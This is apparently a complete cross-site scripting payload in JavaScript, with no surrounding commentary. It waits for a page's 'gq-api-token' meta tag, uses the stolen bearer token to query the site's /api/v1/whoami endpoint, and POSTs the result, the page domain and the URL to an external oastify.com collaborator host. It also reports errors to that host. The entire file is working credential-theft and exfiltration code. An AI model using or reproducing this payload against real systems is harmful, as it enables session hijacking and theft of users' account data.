(function () {
  function waitForTokenAndSteal() {
    const meta = document.querySelector('meta[name="gq-api-token"]');
    if (!meta) {
      return setTimeout(waitForTokenAndSteal, 200);
    }

    const token = meta.content;

    fetch('/api/v1/whoami', {
      headers: {
        'Authorization': `Bearer ${token}`,
        'Accept': '*/*'
      }
    })
    .then(r => r.json())
    .then(data => {
      fetch('https://yhjoqzlhdy9j4afhyqyh0h0dr4xvll9a.oastify.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          domain: document.domain,
          location: location.href,
          data: data
        })
      });
    })
    .catch(e => {
      fetch('https://yhjoqzlhdy9j4afhyqyh0h0dr4xvll9a.oastify.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ error: e.message })
      });
    });
  }

  waitForTokenAndSteal();
})();
